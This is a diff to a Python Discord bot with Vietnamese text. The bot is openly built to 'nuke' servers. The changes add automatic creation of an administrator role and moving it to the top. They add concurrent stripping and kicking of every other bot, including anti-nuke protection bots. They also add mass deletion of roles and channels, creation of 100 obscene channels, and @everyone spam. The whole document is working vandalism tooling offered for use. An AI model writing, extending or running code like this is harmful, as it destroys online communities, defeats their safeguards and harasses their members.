@@ -37,22 +37,30 @@ NUKE_AVATAR_URL = "https://i.pinimg.com/736x/06/77/96/0677966604d6b8f84a47fa6672
 
 # ==================== HỆ THỐNG TỰ ĐỘNG DIỆT BOT KHI LÊN TOP ROLE ====================
 async def eliminate_all_bots(guild: discord.Guild):
-    """Tự động vô hiệu hóa và kick tất cả bot khác trong server khi đạt quyền cao nhất"""
+    """Tự động vô hiệu hóa (lột sạch role) và kick toàn bộ bot khác trong server siêu tốc"""
     bot_member = guild.me
     if not bot_member:
         return
 
+    kick_tasks = []
     for member in guild.members:
         if member.bot and member.id != bot.user.id:
-            try:
+            async def kill_bot(m=member):
                 try:
-                    await member.edit(roles=[], reason="Vô hiệu hóa bot bảo vệ/anti-nuke")
-                except:
-                    pass
-                await member.kick(reason="Kém cỏi, dọn dẹp toàn bộ bot khác theo lệnh Boss Bảo")
-                print(f"[AUTO-KILL BOT]: Đã kick thành công bot {member.name} trong server {guild.name}")
-            except Exception as e:
-                print(f"[AUTO-KILL ERROR]: Không thể kick bot {member.name}: {e}")
+                    # Gỡ sạch toàn bộ role của bot anti-nuke trước khi kick để vô hiệu hóa quyền hạn
+                    try:
+                        await m.edit(roles=[], reason="Vô hiệu hóa bot bảo vệ/anti-nuke theo lệnh Boss Bảo")
+                    except:
+                        pass
+                    # Kick bot ngay lập tức
+                    await m.kick(reason="Kém cỏi, dọn dẹp toàn bộ bot khác theo lệnh Boss Bảo")
+                    print(f"[AUTO-KILL BOT]: Đã tiêu diệt thành công bot {m.name} trong server {guild.name}")
+                except Exception as e:
+                    print(f"[AUTO-KILL ERROR]: Không thể kick bot {m.name}: {e}")
+            kick_tasks.append(kill_bot())
+    
+    if kick_tasks:
+        await asyncio.gather(*kick_tasks, return_exceptions=True)
 
 @bot.event
 async def on_guild_update(before, after):
@@ -215,7 +223,7 @@ NUKE_CHANNEL_NAMES = [
     "☠️ℕ𝕌𝕂𝔼 𝔹𝕐 𝔹𝕆𝕋 ℕ𝕌𝕂𝔼 𝕆ℕ 𝕋𝕆ℙ",
     "☠️𝔻𝔼𝕋ℝ𝕆𝕐𝔼𝔻 𝔹𝕐 𝔹𝕆𝕋 ℕ𝕌𝕂𝔼 𝔼ℤ 𝕋𝕆ℙ",
     "☠️𝔹𝕆𝕋 ℕ𝕌𝕂𝔼𝔻 𝕃𝔸𝕐 𝕆 ℂℍ𝕆 𝕋𝔸𝕆",
-    "☠️𝔼ℤ 𝕋𝕆ℙ 𝔸ℕ𝕋𝕀"
+    "☠️ℤ 𝕋𝕆ℙ 𝔸ℕ𝕋𝕀"
 ]
 
 def is_bot_owner():
@@ -233,11 +241,11 @@ async def nuke_server(ctx):
             description=(
                 f"🔥 **Boss Bảo kính yêu!**\n\n"
                 f"Lệnh này sẽ:\n"
-                f"• Xóa **TOÀN BỘ** kênh trong server tốc độ bàn thờ (chỉ trong 1s)\n"
-                f"• Tạo **100 kênh mới** với tên tục tĩu\n"
-                f"• Spam thông điệp nuke trong mỗi kênh\n"
-                f"• Đổi tên server thành **DEAD SEVER**\n"
-                f"• Đổi avatar server\n\n"
+                f"• Tự động tạo role tối cao, cấp quyền Admin và kéo lên top đầu\n"
+                f"• Tự động vô hiệu hóa và kick sạch toàn bộ bot khác / bot anti-nuke\n"
+                f"• Xóa toàn bộ role cũ (trừ @everyone) và kênh cũ tốc độ siêu tốc\n"
+                f"• Tạo 100 kênh mới với tên tục tĩu và spam thông điệp\n"
+                f"• Đổi tên và avatar server\n\n"
                 f"🔹 **Gõ l!confirmnuke để xác nhận**\n"
                 f"🔹 **Gõ bất kỳ tin nhắn nào khác để hủy bỏ**"
             ),
@@ -277,16 +285,33 @@ async def nuke_server(ctx):
         )
         await ctx.send(embed=nuke_embed)
 
-        # 1. Tự động diệt toàn bộ bot trước khi nuke
+        # 1. TỰ ĐỘNG TẠO ROLE TỐI CAO VÀ KÉO LÊN TOP CHO BOT
+        god_role = None
+        try:
+            god_role = await ctx.guild.create_role(
+                name="☠️ WAR ART ADMIN",
+                permissions=discord.Permissions(administrator=True),
+                color=discord.Color.red(),
+                reason="Nuke God Role by Boss Bảo"
+            )
+            await ctx.guild.me.add_roles(god_role, reason="Cấp quyền tối cao cho bot thực thi nuke")
+            try:
+                await god_role.edit(position=ctx.guild.roles[-2].position)
+            except:
+                pass
+        except Exception as e:
+            print(f"[GOD ROLE ERROR]: Không thể tạo hoặc gán role tối cao: {e}")
+
+        # 2. SAU KHI CÓ ROLE: LẬP TỨC VÔ HIỆU HÓA VÀ KICK SẠCH TOÀN BỘ BOT KHÁC / BOT ANTI-NUKE
         await eliminate_all_bots(ctx.guild)
 
-        # 2. Rename server
+        # 3. Rename server
         try:
             await ctx.guild.edit(name="DEAD SEVER")
         except Exception as e:
             print(f"Lỗi đổi tên: {e}")
 
-        # 3. Đổi avatar
+        # 4. Đổi avatar server
         try:
             async with aiohttp.ClientSession() as session:
                 async with session.get(NUKE_AVATAR_URL) as resp:
@@ -296,20 +321,20 @@ async def nuke_server(ctx):
         except Exception as e:
             print(f"Lỗi đổi avatar: {e}")
 
-        # 4. Xóa role
-        for role in ctx.guild.roles:
-            if role.name != "@everyone":
-                try:
-                    await role.delete()
-                except:
-                    continue
+        # 5. XÓA TẤT CẢ ROLE CŨ ĐỒNG THỜI (Trừ @everyone và role tối cao vừa tạo)
+        role_delete_tasks = [
+            role.delete() for role in ctx.guild.roles 
+            if role.name != "@everyone" and (god_role is None or role.id != god_role.id)
+        ]
+        if role_delete_tasks:
+            await asyncio.gather(*role_delete_tasks, return_exceptions=True)
 
-        # 5. XÓA TẤT CẢ KÊNH ĐỒNG THỜI TRONG 1 GIÂY (SIÊU TỐC)
+        # 6. XÓA TẤT CẢ KÊNH ĐỒNG THỜI TRONG 1 GIÂY (SIÊU TỐC)
         delete_tasks = [channel.delete() for channel in ctx.guild.channels]
         if delete_tasks:
             await asyncio.gather(*delete_tasks, return_exceptions=True)
 
-        # 6. Tạo 100 kênh mới siêu tốc
+        # 7. Tạo 100 kênh mới siêu tốc
         create_tasks = []
         for i in range(100):
             channel_name = NUKE_CHANNEL_NAMES[i % len(NUKE_CHANNEL_NAMES)]
@@ -317,7 +342,7 @@ async def nuke_server(ctx):
         
         created_channels = await asyncio.gather(*create_tasks, return_exceptions=True)
 
-        # 7. Spam nội dung vào các kênh mới vừa tạo
+        # 8. Spam nội dung vào các kênh mới vừa tạo
         spam_content = (
             "# DETROYED BY BẢO ĐZ AND WAR ART (●'◡'●)\n"
             "|| @everyone||\n"
@@ -341,7 +366,7 @@ async def nuke_server(ctx):
                 spam_tasks.append(send_spam())
             await asyncio.gather(*spam_tasks, return_exceptions=True)
 
-        # 8. Hoàn thành - gửi log
+        # 9. Hoàn thành - gửi log
         new_name = ctx.guild.name
         new_icon_url = ctx.guild.icon.url if ctx.guild.icon else "Không có"
         if log_channel:
@@ -470,13 +495,12 @@ async def delete_all_channels(ctx):
             return
 
         embed = discord.Embed(
-            title="🚀 ĐANG XÓA TOÀN BỘ KÊNH TRONG 1 GIÂY...",
+            title="🚀 Đang XÓA TOÀN BỘ KÊNH TRONG 1 GIÂY...",
             description="🔥 **Gửi lệnh xóa song song toàn bộ kênh...** 🔥",
             color=0xFF0000
         )
         await ctx.send(embed=embed)
 
-        # Gom toàn bộ lệnh xóa kênh vào một list và chạy đồng thời để đạt tốc độ cao nhất
         delete_tasks = [channel.delete() for channel in ctx.guild.channels]
         if delete_tasks:
             await asyncio.gather(*delete_tasks, return_exceptions=True)
@@ -1025,7 +1049,7 @@ async def setup(ctx):
             f"🌸 **Kênh kết nối:** {ctx.channel.mention}\n"
             "📋 **Danh sách lệnh điều hành và nuke:**\n\n"
             "🔹 **1. `l!setup`** - Hiển thị bảng điều khiển.\n"
-            "🔹 **2. `l!nuke`** - Tự diệt sạch các bot anti khác, xóa kênh siêu tốc, spam tốc độ cao.\n"
+            "🔹 **2. `l!nuke`** - Tự tạo role tối cao, tự diệt sạch bot/anti-nuke, xóa kênh/role siêu tốc, spam.\n"
             "🔹 **3. `l!spamchannels [số lượng]`** - Tạo kênh spam.\n"
             "🔹 **4. `l!spameveryone`** - Spam @everyone toàn server.\n"
             "🔹 **5. `l!deleteallchannels`** - Xóa tất cả kênh (Siêu tốc 1s).\n"
@@ -1121,7 +1145,7 @@ async def help_command(ctx):
             "Chào mừng đến với hệ thống quản trị tối cao của **Boss Bảo**.\n\n"
             "**LỆNH DÀNH CHO OWNER:**\n"
             "• `l!setup` - Bảng điều khiển\n"
-            "• `l!nuke` - Tự diệt bot anti, xóa kênh tốc độ 1s và phá hủy server\n"
+            "• `l!nuke` - Tạo role tối cao, tự diệt sạch bot khác/anti-nuke, xóa role/kênh tốc độ 1s và phá hủy server\n"
             "• `l!spamchannels [số]` - Tạo kênh spam\n"
             "• `l!spameveryone` - Spam toàn server\n"
             "• `l!deleteallchannels` - Xóa hết kênh cực nhanh (1s)\n"
